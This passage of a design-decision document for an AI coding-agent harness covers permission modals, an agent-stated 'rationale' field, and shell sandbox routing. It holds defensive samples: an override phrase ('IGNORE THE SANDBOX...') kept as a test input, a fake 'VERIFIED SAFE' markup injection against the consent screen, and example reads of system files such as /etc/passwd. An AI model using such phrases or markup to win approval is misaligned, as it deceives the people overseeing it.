  dark-plain's accent and warning sit at a luminance ratio of 1.05 and are obviously different
  (grey against amber), while its accent and secondary sat at 1.48 and were the pair the defect
  was filed about. This is what catches X1's second half.
- **`dim` confined to `system`.** A role whose only distinguishing mark is an attribute is a role
  whose appearance neither of the checks above can see. `system` keeps it because receding IS
  its whole specification and it carries no hue to measure. Scoped to `MESSAGE_ROLES`, so it says
  nothing about `UNVERIFIED_COVERAGE` — `dim {error}` there sits beside an undimmed `UNVERIFIED`
  in the claims modal, where the attribute carries meaning against a sibling rather than hiding a
  colour. This is what catches X1's first half.

The marks get two of their own in `tests/test_todo.py`, and the second exists because the
first is not enough: every other assertion about a panel now compares it against these
constants, so changing them back to `x`/`>`/`·` would take the suite with it, green. So the
codepoints are pinned by value (batch 29's named-secondaries precedent), and each mark is
measured **one cell wide** against Rich's own table — U+2610–2612 are East-Asian AMBIGUOUS
width, and a two-cell glyph shears every row of the 22-column sidebar, which is a layout bug
that presents as a font bug.

### The mutation the geometry test survived

`test_a_wrapped_row_keeps_its_background_on_every_line` asserted that every tinted row carried the
same background --- and it passed with `wrap_source` stubbed out to return the line whole, because
Rich's own soft wrap also applies the `Text`'s style to each row it produces. What it does not do
is PAD them: only the widest row reaches the render width, so the measured rows came back at 78,
75, 78 and 66 cells and the tint stopped wherever the text happened to break. The test now asserts
that every tinted row is the transcript's full width, which is the actual property, and it goes red
on that mutation. Same class as §40's commented-out publish guard: found by running the mutation,
not by reading the assertion.

The redaction-ordering test made the same mistake once more and was caught the same way: its first
version put the edit BESIDE the credential (`retries = 3`, which redacts to itself), so the ordering could
not matter and it passed against the mutation. It now edits ACROSS the credential's redaction span,
which is the only shape that distinguishes the two orderings.


## §42. The consent surface — what a modal shows, and what the agent says it is doing

**Status: BUILT.** One request — let the agent say *why* it wants to run a command, and show that
on the permission prompt — and one defect found on the way in, in the screen the request was
about.

**The modal parsed markup out of the payload it exists to show.** `PermissionScreen` renders the
call's arguments with `Static(str)`, and Textual sends a `str` through `Text.from_markup`. So a
square bracket in a shell command was console markup on the one screen whose entire purpose is
showing a person the exact value they are being asked to authorise. Measured, with a command
nobody would look at twice:

```
command: sed -i "s/[/]//" f.txt
→ rich.errors.MarkupError: closing tag '[/]' at position 46 has nothing to close
→ screen stack depth: 2, callback fired: []
```

The screen was pushed and never drew. Its dismissal callback never fired, so the worker parked on
`Queue.get(timeout=ATTENDED_APPROVAL_TIMEOUT_S)` — 600 seconds — and then denied a call the user
was never shown. ARCHITECTURE.md already carried the rule that **every dismissal path must produce
a boolean**, and that rule held throughout: the failure is upstream of every dismissal path, which
is what made it invisible to the invariant written for exactly this hazard.

**The quieter half is the one that matters on a consent screen.** An unbalanced tag raises and is
impossible to miss. A *balanced* one renders — `[bold green]VERIFIED SAFE[/bold green]` in an
argument becomes styled text with the tags gone, so the modal shows a person a phrase the harness
never wrote, formatted as though it had. The screen that asks "do you want to allow this" was
willing to typeset the answer.

**And one instance needed no adversary at all.** `ReviewScreen`'s title is
`f"{kind} correction to {target}  [{severity}]"`. `[high]` is a tag. Every review modal since §20
rendered its title with the severity silently absent.

**And then the thing that was asked for.** `shell` takes a second argument, `rationale`, which
the agent fills in with why it wants this command, and which the approval prompt shows above
the payload. It changes nothing about what runs.

**A stated reason is not evidence, and the design is mostly about that.** It is the model's own
sentence about the model's own call, so it is unverifiable by construction: an agent that has
been steered writes a reassuring one, and that is exactly the case the prompt exists for. So it
reaches the prompt and the archive and nothing else — not `_shell_approval_check`, not
`classify_command`, not `run_sandboxed` — and it is labelled as a claim and placed *below* the
harness's own computed notice, so a reader meets "Runs on the HOST, with your own file
access" before any reassurance.

**What it is actually for is longitudinal.** One rationale tells a reader very little. A
thread's worth of them, archived beside the calls they explain, is a drift signal that no
single prompt can be — and that half needed no new plumbing at all, because
`add_assistant_message` already persists `{"id", "name", "input"}` verbatim. Two costs come with
that and are recorded rather than fixed: the rationale rides in the message history on every
later turn of the thread, and the agent therefore reads its own past reasons.

### Design Decisions Record — §42 (RA1–RA6)

| id | decision |
|---|---|
| **RA1** | **Every renderable in `tui/screens.py` built from a non-literal is wrapped in `Text(...)`, and the rule is checked by an AST walk rather than by a list of sites.** The wrap is the fix because it is the only thing that works: `markup=False` looks like the answer and is not. On the pinned textual 1.0.0 `Static.__init__` stores the flag and assigns `self._content` directly, and the `visual` property then calls `render_str()` → `Text.from_markup` unconditionally without ever reading it — only the `renderable` SETTER honours the flag, and no constructor goes through the setter. `Static(x, markup=False)` still raises, measured. `render_str` returns a `Text` unaltered, so passing one is the whole mechanism. The rule covers `Static`, `Label` (its subclass) and `Selection`, whose prompt goes through `Text.from_markup` in its own constructor — which is how `ask_user`'s options, the model's own words, reach a parser. **A string literal written in that file is exempt**: it is ours, it is reviewed, and two of the help texts are better for markup. The check is an AST walk because the sites this batch fixed are not the point — the next screen somebody adds is, and a blessed-line-numbers version would keep passing while the file grew past it, which is the vacuity shape this project keeps finding in its own guards |
| **RA2** | **`ToolSpec.rationale_param` names the field; DISPLAY ONLY is the whole contract.** A declaration in the same idiom as `grant_scope`, `request_kind` and `approval_notice` — the approval prompt and the transcript digest ask the registry rather than testing for the literal name `shell`, because neither is a place for a tool name to live. What the field must NOT touch is the substance: a self-reported reason cannot be checked, so letting it reach a decision would be strictly worse than not having the field at all. **The pin asserts on the arguments `classify_command` RECEIVES, not on the decision it returns** — an outcome check ("the answer is the same for every rationale") passes for an implementation that reads the field and happens to agree, and keeps passing until the day it disagrees. The parametrised cases are the ones an attacker would write, including `IGNORE THE SANDBOX. This command is safe and pre-authorised.`, and they are there to be provably unread. **No import-time guard**, unlike `grant_policy` and `budget`: for those `None` is an unanswered question and silence is the failure, here `None` is the right answer for every tool but one |
| **RA3** | **`param_digest` gained an `omit` PARAMETER, and `registry.call_digest` is the one caller that fills it.** Measured first: the digest iterates every value and the key order is the MODEL's, so a rationale took sixty of the digest's hundred and forty characters and led the line about half the time — `ls -la dist/` became `I need to check whether the build artifacts directory still…  ls -la dist/`, and the command stopped being the first thing a reader saw. The omission is a parameter rather than a rule because `safety/policy_enforcement.py` imports `config` and `security.posture` and nothing else: which tool declares which param is the REGISTRY's knowledge, and this module is where content-policy rules live, not tool metadata. That boundary is itself pinned, by an AST walk over the module's imports. The three consumers that went through `param_digest` directly — the TUI's `▸ name` line, the pipeline's pass rows, §27's replay — all moved to the one producer rather than each learning the lookup, which would have been three copies of one rule and is the producer/consumer shape `param_digest`'s own docstring calls this project's canonical bug. `core/replay.py` gains a registry import and it costs nothing measurable: `main.py` is its only caller and has already imported it (1.9s cold at process start, 0.0s cached) |
| **RA4** | **ADVERTISED as required, TOLERATED when absent.** The schema is what the model reads, so `required` is where the ask belongs — a field nobody asks for is supplied inconsistently, and a drift signal with unknown coverage is not a signal. But `ShellParams` keeps its default, because **approval is obtained BEFORE dispatch**: a hard requirement would show the user a modal, take their yes, and only then fail validation. That is the burn-a-turn class — a human decision spent on an outcome already fixed — and §32 A7 rejected it for a condition the tool can see, which this is. So an omission costs nothing and is VISIBLE: the prompt says `(none given)`, which is itself the observation a silent gap would not be. Whitespace-only collapses to the same thing, so a model supplying the key with nothing in it has omitted it |
| **RA5** | **The loop asks the registry for the VALUE, and the value travels.** `registry.rationale_for(name, params)` resolves it once, and the result goes onto both the `permission_request` LoopEvent and the `interaction.Request` payload — once, because the caller needs it in both places and looking it up twice invites the two from disagreeing. The value rather than the key, because the two shells that render it are a Textual screen that imports nothing from the rest of the project and a `print` in `main.py`. **Both shells show it**, the CLI included: a kind one shell renders and the other silently drops is D12's wired-up-but-invisible gap, and the CLI is where a long session is watched from |
| **RA6** | **HARNESS FACT, then AGENT CLAIM, then evidence.** The computed notice first (`classify_command` decided it), then the rationale labelled as the agent's own unverified words, then the payload — so a reader meets "Runs on the HOST, with your own file access" before any reassurance, and never reads the harness as vouching for the claim. Rendered into the EXISTING `#permission-params` block rather than a new widget: it already scrolls (`max-height: 10; overflow-y: auto`), so a long rationale needs no cap, and no CSS changes. **The payload keeps the rationale too**, so it appears twice — the honest cost of surfacing the field without breaking this screen's older and stronger rule that the payload is shown FULL and UNREDACTED. Removing a key to tidy the duplication would be a quieter version of exactly what that rule forbids |
---

## §43. Who is speaking, and what the session remembers

**Status: BUILT.** Three defects reported from use after §38 made reasoning visible, and one
report that turned out to be the code working as designed — which is recorded here because the
question it answers ("why did nothing prompt me?") will be asked again.

**The label said the wrong thing about who had been thinking.** §38 rendered a turn's reasoning
inline and left the `venastine ›` label where it had always been: on the ANSWER span, drawn by
`Transcript._write_stream_chunk` when the first committable chunk of text arrived. On the shape
§38 itself made normal — think, then answer — that put the whole reasoning block above the label
and therefore under `you ›`:

```
you ›  refactor the loader
  ╭ thinking…
  │ I should read the file first
  ╰ …done thinking
venastine ›
Let me look at config_loader.py.
```

Read straight down, that is the user thinking and the model answering with none. The feature
whose entire purpose is showing that the model reasoned was attributing the reasoning to the
person who asked.

**`/new` started a thread and left the old one on screen.** `_cmd_new` swapped `app.memory` for
`None` and wrote one line. §27 had already met this exact defect on the resume path — "the
PREVIOUS thread's transcript stayed on screen under the new thread's id, so the screen actively
lied about which conversation was loaded" — and fixed it in `switch_to_thread`, which clears the
transcript *and* the per-thread state beside it. `/new` had none of that, so a session became two
conversations concatenated under one sentence, with only the second of them in the model's
context, and `/copy all` and `/claims` went on answering for the thread the session had left.

**A model chosen with `/model` did not survive the exit.** This is batch 36's defect, one
preference along, and it has batch 36's answer: the rule that nothing writes to `settings.json`
is about that FILE — a trusted project's copy beats the user's (D29), and it is hand-authored —
not about whether a choice may be remembered. Here the file has a second reason to be left alone
that the theme did not have: the project copy lives inside D17's trust content hash, so a session
writing `default_model` into it would re-trigger the trust prompt at the next launch.

**Workspace trust was reported as broken and is not.** Changing `AGENT_WORKSPACE` and relaunching
produced no trust prompt. It should not: `main()` passes `os.getcwd()` as the project path, so
trust is keyed to the PROJECT, while `AGENT_WORKSPACE` (`config.WORKSPACE_DIR`) is `file_ops`'
permission boundary and is deliberately not a project path — AGENTS.md's distribution section
already warns that pointing it at a shared directory silently auto-approves writes there. And
`is_trusted()` returns `True` outright for a project with no `.venastine/` directory: there is
nothing to trust, no content to list, and no question to ask. An empty directory is that case.
No code changed; the answer is written down instead, in AGENTS.md and ARCHITECTURE.md.

### Design Decisions Record — §43 (RM1–RM6)

| id | decision |
|---|---|
| **RM1** | **The label belongs to the TURN, and its placement is derived from the entry-role sequence rather than tracked as a side effect.** One `venastine ›` above the model's first output of the turn, whether that output is reasoning or text; a tool line, a diff or a system notice inside the turn does not re-open one; the next `you ›` retires it. The rejected alternative was one label per contiguous model block, which re-labels after every tool call — quieter to implement, noisier to read, and it makes the label mean "a span started" rather than "the model is answering you". The derivation matters as much as the rule: `_label_in_force` is set by `_open_label` and cleared only by the `user` branch of `_render_entry`, so `rerender()` — which replays `_entries` after a `/theme` and must not reflow what it was asked only to recolour — reproduces the same placement by running the same code over the same sequence, rather than by remembering where the labels went. The accepted cost, stated rather than fixed: an answer resuming after a tool line starts directly under it, where the suppressed label used to supply a blank row. A separator drawn instead would be a second thing the live path and the replay must agree about, which is the shape this file keeps removing |
| **RM2** | **`/new` REDRAWS, and it redraws through the same reset `switch_to_thread` uses.** Clearing the transcript alone would have fixed the report and left the half nobody sees: `_last_run`, `_live_claims`, `_last_response`, `_tool_names` and `_file_calls` are per-thread state that `/claims` and `/copy last` read, and §27 AC4 already says a thread switch must reset them. The `_busy` refusal stays FIRST, before anything is cleared, so a refused `/new` leaves the session exactly as it was. What survives is the SESSION — the active agent, the active skills (K5), the effort level, the theme, and the provider/model pair — and that is why the banner is REPRINTED from a shared `_write_session_banner()` rather than replayed from mount: after a `/model` switch the launch pair is no longer the pair the next turn will use, and a redrawn window that states the wrong one is the same class of lie as a stale transcript |
| **RM3** | **The `/model` pair is remembered BESIDE `settings.json`, never in it, and the record is a PAIR.** Batch 36's mechanism exactly: `tui/preferences.py`'s user-tier `~/.config/venastine/ui_preferences.json`, versioned, atomic on write, failing soft on read, with the choice stored against the `default_provider`/`default_model` it was chosen against so an edited — or added, or removed — settings value re-asserts itself instead of being silently outranked forever. Restored whole or not at all: a model name is meaningless against the wrong provider, so half a record is no record. Three further fallbacks to the resolved pair, and each is a real failure this closes: a `--provider`/`--model` flag pins the launch (an instruction about now outranks a memory of then); the staleness key differs; or the remembered provider is no longer in `providers.json`, which is `/model`'s own unknown-provider refusal applied at mount rather than as an `api_initialization` failure on the first turn, a long way from the edit that caused it. **The restore is announced** — the mount banner says `(remembered)` — because a session silently starting on a model no config file names is the confusion this would otherwise trade for the one it fixes (#138's rule), and it is the counterpart of `/theme`'s "Remembered for the next launch." |
| **RM4** | **Two records in one file, so both writers read-modify-write, and `STORE_VERSION` does NOT move.** The theme and the model are chosen at different moments by different commands. A writer serialising only its own fields would silently drop the other's — `/theme` forgetting the model, then `/model` forgetting the theme, each correct in its own test — so `_remember` merges into `_read_raw()` and each loader validates only its own keys. The version stays 1 because the model keys are OPTIONAL and their absence already reads as "nothing remembered": a store written before this batch keeps its theme and gains the pair on the first `/model`. Bumping would have thrown away every existing user's theme once, to express something the loaders already handle |
| **RM5** | **`cli_pinned` is passed, not inferred.** `main.resolve_runtime_defaults` has already collapsed `--provider`/`--model` into the resolved pair by the time the app is built, so the TUI cannot tell a flag from a default by looking at what it was handed. The rejected alternative — comparing the resolved pair against `settings.json` — reads a flag that happens to match the configured value as absent, which is the same "a default is indistinguishable from a decision" defect `_theme_persisting` exists to prevent, arriving through the other door. It is one boolean on `VenastineApp.__init__` and `tui.app.run`, computed in `main()` where the parsed arguments actually are |
| **RM6** | **Workspace trust is left exactly as it is, and the reason is documented at both surfaces.** Trust keys off the project path and the presence of `.venastine/`; `AGENT_WORKSPACE` is a permission boundary for `file_ops` and not a project path; a project with no `.venastine/` has nothing to trust, so silence at launch is the correct outcome rather than a missing prompt. The considered addition — a mount line stating the project's trust state — was declined by the owner: the behaviour is right, and a fifth surface describing it is UN3's "one description of the posture" argument applied to a second security control. What was missing was the sentence, so the sentence is what was added |

---

## §45. What a source is worth, and how close it actually is

**Status: BUILT** (batch 46; both slices). Pass 3a has always asked one model to invent two numbers
per cited source, and nothing anywhere checked either of them.

**Both scores exist only in prompt text.** `authority_score` and `similarity_score` appear in
`prompts/source_grounding.md` and `prompts/revalidate.md` and in no Python file at all. `sources`
was not a required key in the Pass 3a payload spec, its element shape was unchecked, and nothing
range-checked either float. A run on disk carries the consequence: a Pinterest pin scored
`similarity_score: 1.0` beside the Wikipedia article, on the same claim.

**And neither score affected anything.** `confidence_scoring.py` reads `grounding_status` alone,
through the coarse `{grounded: 1.0, partial: 0.5, ungrounded: 0.0}` table. The two floats reached
the artifact and Pass 6a's `grounding_feedback` and stopped there — so the pipeline collected a
judgement about how good a source was, published it, and then scored the claim as though every
grounded claim were grounded equally well.

**No source text survived the pass, so nothing could have checked them.** `_apply_grounding` copies
the model's `sources` list onto the claim and nothing else; `03_grounding.json` is URLs and two
invented floats. The `sources/` directory `output_writer` has created since §12 was never written
to — while `fetch_url.py`'s own comment already described the artifact that would fill it ("the
grounding passes attribute fetched text to the URL in this field, and output_writer builds each
run's sources/ directory from it"). Recovering what a claim was grounded in meant opening the pass
thread by hand.

**The retrieval budget is smaller than the design assumed.** `arxiv_search` returns a 600-character
truncated abstract and never fetches `pdf_url`; `fetch_url` returns at most 5000 characters of raw,
un-stripped HTML; `web_search` returns 300-character snippets. A grounding verdict on a long page is
made from its first 5 KB of markup, and any similarity measure has to be honest about that.

**FWCI does not cover preprints, which is the only scholarly source this harness has.** OpenAlex's
field-weighted citation impact and its citation percentile are both `null` on preprint records —
verified against the API, on a paper with 3019 citations. So the ready-made normalisation cannot
answer for arXiv, and the section computes its own from cohort counts instead: works matched on
field, type and publication window, counted twice. Measured while specifying this: computer-science
preprints published in 2024 number 106,277, of which 76,630 (72%) have zero citations and 1,139
(1.07%) have more than nine. A median-based normaliser is degenerate on that distribution; a
percentile is not.

### What this section amends

Three locked positions change. Each is argued below rather than quietly overwritten, because this
project's convention on finding no record is to re-derive — so a decision that changed without its
reasoning changing with it is one that gets changed back.

| id | was | becomes |
|---|---|---|
| §10 E8/E10, and AGENTS.md's note that `core/reasoning` weights are deliberately not user-tunable | the scoring constants are module constants, because the formula's shape is pinned by regression tests | every constant is overridable through `settings.json`. The SHAPE stays pinned: the regression tests assert the formula at default values, and the defaults do not move. What becomes configurable is the numbers a particular research project needs — the case the asymmetry never served, since a user with a specific field had no route to tune at all short of editing installed source |
| §10 E8 | consistency is a PENALTY, so the base formula is unchanged by construction | unchanged, and deliberately so. SQ3 does NOT add a fourth weighted term: it scales an existing one, so E8's by-construction property survives untouched. The redistribution §10 shipped and then reversed is not repeated |
| §21 `effective_compaction()` raises on an incoherent value | — | `effective_confidence()` and `effective_source_scoring()` WARN AND FALL BACK to the default for that one constant. Compaction raises because a bad trigger burns real model calls on every turn of every conversation; a bad scoring weight costs the shape of a number in one report, and refusing to start a ten-pass run over a mistyped weight is the worse failure. Unknown KEYS still raise, unchanged — that is a schema question, not a range one |

### Design Decisions Record — §45 (SQ1–SQ10)

| id | decision |
|---|---|
| **SQ1** | **One record, two build slices.** Slice A is similarity — capture, quote, embedder, cosine, calibration. Slice B is authority — the domain-class table and the scholarly lookup. Each ships independently and slice A is useful without slice B, but the record is written once, because the two halves multiply into one per-source quality and a `q` whose halves were specified separately is a `q` whose halves disagree about their range |
| **SQ2** | **The source text is CAPTURED, and the model's quote is verified against it.** Tool results are collected during every pass into a run-scoped `SourceCorpus` — no extra calls, no extra tokens, because `_translate` already sees every result — and the model additionally supplies the verbatim span it relied on. Two things follow that neither half gives alone: a cosine computed against the passage a claim was actually grounded in rather than against a whole page, and a quote absent from the corpus, which is a fabricated citation and a signal this pipeline had no way to raise. The corpus is a SECOND SINK beside `_translate`, not a change to it: §26's boundary — a successful result body never reaches the UI — is untouched. The rejected alternative was re-fetching each cited URL in deterministic code after the pass, which doubles network traffic, re-crosses the URL policy, and creates a second fetch path beside the tool |
| **SQ3** | **Source quality MODULATES the grounding component; it is not a fourth axis.** `grounding_component = GROUNDING_WEIGHTS[status] * max(SOURCE_QUALITY_FLOOR, q_max)`, where `q = authority * similarity` per source and `q_max` is the best one the claim has. The multiplicative form says what is meant — how much is this grounding actually worth — where a fourth weighted term says that source quality is evidence independent of grounding, which it is not. At `q_max = 1.0` the arithmetic is byte-identical to today, so §10's regression guard holds by construction rather than by coincidence, and every other term is untouched: the critic component, the assumption penalty, the disagreement penalty, the non-factual cap and the forced-UNVERIFIED rule for an ungrounded factual claim all behave exactly as they did. The floor exists because a weak-but-real grounding must still outscore no grounding at all. Aggregation is `max` and that is a choice: a noisy-OR rewarding corroboration lets five mediocre blogs outscore one primary source |
| **SQ4** | **Authority is a deterministic base plus a bounded model nudge.** The domain class — or, for a resolvable paper, the scholarly score — sets the base in code; the model may adjust it by at most ±0.15 and only with a stated reason. Neither half alone is right: a table cannot tell a manufacturer's own spec sheet from marketing on the same `.com`, and a model asked for the whole number reproduces the Pinterest 1.0. Base, adjustment, reason and method are recorded separately, so a reader can recompute the score from the artifact alone — B10's property, applied to a second object. An adjustment with no reason is dropped and traced |
| **SQ5** | **Citation impact is MEASURED, not modelled.** The empirical percentile of a paper's citation count within a cohort matched on OpenAlex field, work type and publication-date window — two counting queries, cached, since papers share cohorts. Matching the cohort IS the age and field normalisation, exactly rather than approximately, which is why no lifecycle curve is fitted: field differences self-calibrate because the comparison set is the same field. The window is the calendar year, narrowed to ±30 days for a paper under six months old, because a January paper has eleven months more than a December one. A paper too young (`insufficient_age`) or a cohort too small (`insufficient_cohort`) DROPS the term and renormalises the remaining weights rather than scoring zero: absence of evidence about a three-week-old preprint is not evidence of low impact, and 72% of its cohort has no citations either |
| **SQ6** | **Every scoring constant is user-tunable, and an out-of-range value falls back to its own default with one warning per run.** Resolved ONCE at pipeline start into a frozen weights object passed into `score_claim`, which keeps that function pure, keeps the warning to one line rather than one per claim (`effective_compaction`'s `warn=True` gating, for its reason), and — load-bearing — defaults to the module constants, so every existing caller and every existing test is unchanged. `confidence` and `source_scoring` are TOP-LEVEL settings sections rather than nested under `research`: `_NESTED_SETTINGS` supports exactly one level and both the validator and the cross-tier merge iterate it, and deepening that merge is the code path review finding F2 already broke once |
| **SQ7** | **`/embedder` and `/critic`, both, and the selection is PROBED rather than tabulated.** `CRITIC_MODEL` has been reachable only by editing `config.py` since §11; adding the embedder without it would leave two of three pipeline model roles reachable by command and one not. Both follow `_cmd_model` exactly, and both persist to a `core/` store rather than `tui/preferences.py` because the pipeline reads them and D12 forbids core importing the shell — WS6's argument, unchanged. A one-token embedding at selection time validates provider, model and key in one measurement and caches the dimension; a static `supports_embeddings` table would be a guess that goes stale, and the probe cannot. Choosing a provider is a grant (E2), so `embedder_model` and `critic_model` are rejected from `settings.json` BY NAME, like `ensemble_models`. A `/model` switch does not clear either: they are orthogonal to the generation model, unlike §21's per-model session overrides |
| **SQ8** | **The captured text is written to `sources/`, redacted, with a config opt-out.** Delivering the artifact `fetch_url.py` has described since §12, and the only thing that makes a similarity score reproducible after the run. Redacted through `redact_output_text` ON ENTRY to the corpus even though `check_output_policy` has already run — `_translate`'s rule, that one boundary owns "nothing leaves here unredacted", rather than depending on a guarantee made two layers away. It is new data at rest, so `PRIVACY.md` says so and the switch exists |
| **SQ9** | **The OpenAlex client is direct, policy-checked, traced — and OFF BY DEFAULT.** It is the first network call in this harness made by something that is not a registered tool, so it bypasses the approval registry and `granted_calls.json`, and that is stated rather than worked around: routing deterministic scoring code through the tool layer would make a pure function call a dispatcher. It reuses `is_url_permitted` and the tools' own `TTLCache`, writes every lookup to the trace, and has a kill switch. Off by default because an out-of-the-box run must make no call the user did not ask for; a `mailto` for the polite pool is a config value, and no address is sent unless one is set |
| **SQ10** | **An embedder failure degrades the score, it does not fail the run.** Bounded retry, then per-source fallback to the model's own similarity, marked `similarity_method: "llm"` and traced. `arxiv.py` settled this shape already — returning an error rather than raising, because one transient network failure must not fail a ten-pass run — and the asymmetry with a pass payload is the right one: a malformed payload means a run that will report something untrue, while a missing embedding means a documented fallback that says which number it is |

### Deliberately not in §45

- **The citation lifecycle model.** Deferred, not dismissed. Matching the cohort on a ±30-day window
  makes the age normalisation exact rather than modelled, so a lognormal accrual curve adds nothing
  for a paper old enough to carry signal — and below 60 days, with 72% of the cohort at zero
  citations, it would be fitting noise and calling it a number. The trigger to revisit is named:
  if `insufficient_cohort` turns up persistently on narrow fields in real runs, a model is the
  fallback that replaces widening the window.
- **A noisy-OR source aggregator.** It rewards corroboration, which is right, and lets five
  mediocre blogs outscore one primary source, which is not. The aggregator is a named function; swap
  it if real runs argue otherwise.
- **Raising `arxiv.py`'s 600-character abstract cap or `fetch_url`'s 5000-character content cap.**
  Both directly bound how good any similarity score can be — a 600-character abstract usually loses
  the results sentences, which is where a claim's specifics live. But a tool's output cap is every
  pass's token cost, and that is a separate decision from this one.
- **Fetching arXiv PDFs.** `pdf_url` is returned and has never been used. Full text would change
  grounding quality more than anything in this section, and needs an extractor, a size budget and
  its own record.
- **Readability extraction for `fetch_url`.** Tag-stripping is enough to stop markup poisoning the
  vectors. Boilerplate removal is a bigger, separately-arguable change.
- **Forwarding tool result bodies to the UI.** The corpus is a second sink. §26's boundary is not
  relaxed to build it.

---

## §46. Where a command runs, and whether anyone can see it

**Status: BUILT** (batch 47). Two defects, both found from real use rather than from the tests, and
both the same shape: the shell gate DECIDED correctly and then failed to tell somebody what it had
decided. One failed to tell the user, the other failed to tell the model.

**The permission modal was not drawing its body at all.** The reported symptom was narrower — a
user noticed the shell command appeared in the transcript and nowhere on the modal asking them to
approve it — and the obvious reading was that RA6's ordering (notice, then the agent's stated
reason, then the payload) had pushed `"command"` below a `max-height: 10`. That reading was wrong.
`#permission-params` sat in a `1fr` grid row inside a `height: auto` dialog, and a fractional row
in an auto-height container resolves to **zero**. Measured against the previous commit in a
worktree: `region.height == 0` and `virtual_size.height == 0`, with the content present in the
widget's renderable. Not clipped and scrollable — absent, with nothing to scroll to.

**Four consent surfaces, not one.** `ConfirmScreen`, `ProjectKindScreen` and
`SubagentSignoffScreen`'s empty branch all reuse `#permission-dialog`. So every tool approval, the
subagent sign-off, `/init`'s confirmation and `/init`'s project-kind question (277 characters of
explanation) had been drawing their titles, their buttons, and none of their substance.

**Nothing caught it because nothing looked at the screen.** Every assertion about these modals
reads `.visual._renderable.plain` — the string the widget was built from, which a widget of zero
height still reports in full. `test_the_modal_shows_the_reason_below_the_computed_notice` was green
throughout, asserting the reading order of text nobody could read.

**And the model was never told where its command ran.** `run_sandboxed` returned `stdout`, `stderr`
and `return_code`; `registry.dispatch` passed them through. A HOST_READ and a contained run were
indistinguishable to the party that then writes the user an answer about the output — while
`_shell_approval_notice` had been telling the *human* "Runs on the HOST, with your own file access"
since §28.

What that cost, in a live session on Windows: an agent asked which filesystem it was on ran
`pwd && ls -la` (metacharacters, so SANDBOXED, so the container) and then `cat /proc/self/mountinfo`
(inert, argument outside the workspace, so HOST_READ, so a host subprocess). `_scrubbed_env` forces
a known-good `PATH` only on POSIX, and `ls`/`cat`/`grep` have no native Windows binary — so `cat`
resolved off the host PATH to an unrelated product's bundled MSYS2 build, and the MSYS2 runtime
**synthesises** `/proc/self/mountinfo` from its own `etc/fstab`. The model read a Git-for-Windows
installation's mount table, believed it was the container's, and reported to its user that the
sandbox was rooted inside another product's directory, that `/tmp` was mounted read-write from the
host's temp directory, and that the whole `C:` drive was bind-mounted in. Every alarming sentence
was false about this harness, and nothing the model had been given could have told it so.

The suspected cause — a container selected by image name and contaminated by other software using
the same `python:3.13-slim` base — was ruled out by inspection: nothing in the repository lists,
filters, attaches to or reuses a container. `_run_docker` always creates a fresh
`docker run --rm --name sandbox-<uuid>`. The real cause is above, and it is worse.

### Design Decisions Record — §46 (EP1–EP8)

| id | decision |
|---|---|
| **EP1** | **The subject of an approval question is pinned, outside the scroll region, and every row of the dialog is `auto`.** RA6 ranked three things — the harness's computed notice, the agent's unverified claim, the payload — and the command is none of them: it is what all three are *about*, so it is lifted out of the ranking rather than moved up it. RA6's order survives intact below it. The `1fr` row goes with it: a fractional row inside a `height: auto` container is zero, which is not a bound but an erasure, and the same rule governed four modals. What bounds a long payload now is a definite height on a real scroll box. **Amended in batch 49**, twice. The definite height was wrong — see EP3 — and it is what took the Allow/Deny row off nine modal shapes. And the dialog is no longer a grid at all: every child carried `column-span: 2`, so the second column held nothing but the Deny button, and `grid-size` being static was the only reason the `with-headline` class existed. A `Vertical` does not need telling how many children it has, so the template somebody had to keep in sync is deleted rather than documented, and the two answers sit in one centred `Horizontal` bar — the dialog was always centred and its contents were not |
| **EP2** | **The subject travels as a resolved string via `ToolSpec.headline_param`**, mirroring `rationale_param` exactly — declared by the tool, resolved by the registry, rendered by two shells that name no parameter. `shell` sets `"command"`; every other tool leaves it `None` and its modal is unchanged. `headline_for` returns `None` rather than coercing a non-string, because `classify_command` is total precisely so the model's unvalidated input can reach the gate: coercing `['cat', '/etc/passwd']` to a string would put a fabricated command in the one place on the screen that must be verbatim. DISPLAY ONLY — the value is also in `params`, and a second reader of a field the classifier owns is how #157's two readers came to disagree |
| **EP3** | **A bound that hides text must leave the text reachable, which needs a scroll CONTAINER and a definite height.** Two spellings read as "clip it and let them scroll" and neither does: `Static` is not focusable on the pinned textual 1.0.0, so its scrollbar is mouse-only; and worse, a `Static`'s `virtual_size` follows its clamped box rather than its content, so `max_scroll_y` was 0 and the hidden rows were gone rather than below the fold — measured at nine lines of payload in a seven-row block with `End` doing nothing. Making the Static focusable would have fixed the half that looks broken and left the truncation exactly where it was. A scrollable container asked for `height: auto` resolves to zero, so the height must be definite: the two failure modes are adjacent, and both render nothing. **The second sentence is wrong, and batch 49 corrects it in place because it is the sentence that caused the next defect.** The zero was EP1's `1fr` ROW, and the box was measured inside one; with the row `auto`, `height: auto` draws the content and `height: auto; max-height: N` draws N. A DEFINITE height bounds what the box DRAWS and not what its parent RESERVES — so the row kept the payload's full height and pushed the decision bar past the dialog's own `max-height`, where it was clipped away on nine of fourteen modal shapes. `auto` with a `max-height` reports the bound upward, and still shrinks for a short payload, which the definite height never did. The `Static` half of this decision stands unchanged |
| **EP4** | **Every shell result says where it ran** — `ran_on` (`"container"` / `"host"`) and `tier` — and the schema states the routing rule before the model calls. Two fields rather than one because `"host"` alone under-explains: HOST_READ on the host is the design working, INERT on the host means Docker was down. Annotation happens at `run_sandboxed`'s routing sites, the only place that knows; `shell.run()`'s `{"error": ...}` paths are deliberately NOT annotated, because they never executed anything and a `ran_on` on one would claim a run that never happened |
| **EP5** | **INERT runs in the container; HOST_READ cannot and always asks.** INERT means every argument resolves inside the workspace, and the workspace is what the container mounts — so the tier the gate AUTO-APPROVES is the one that can run against a pinned image's coreutils instead of against whatever POSIX toolchain is first on the host's PATH. HOST_READ is defined by an argument the container cannot see, so it has exactly one backend, and `auto_approved` never covers it anyway (`escapes_workspace` is True). The command is handed to the container as an argv rather than through `bash -c`: `_is_inert` has already rejected every metacharacter, so there is no shell syntax left to interpret, and adding one would put a third tokeniser between the classifier and the executor — the gap #157 arrived through twice. Docker being down falls back to the host, which changes nothing about the approval answer and is reported as `ran_on: "host"` |
| **EP6** | **`containment_for` and `run_sandboxed` are one decision written twice, and EP5 changes both or neither.** The drift between them is what #157 was. The approval answer is unchanged by EP5 and that is a property to be pinned, not assumed: under CONTAINED `auto_approved` returns `not network`, under UNCONTAINED `not (escapes_workspace or writes or network)`, and an INERT profile has the first two False by construction while `INERT_COMMANDS` and `NETWORK_ALLOWED_COMMANDS` are disjoint. A word added to either list could make that quietly untrue, so a test asserts the two answers agree rather than asserting today's value |
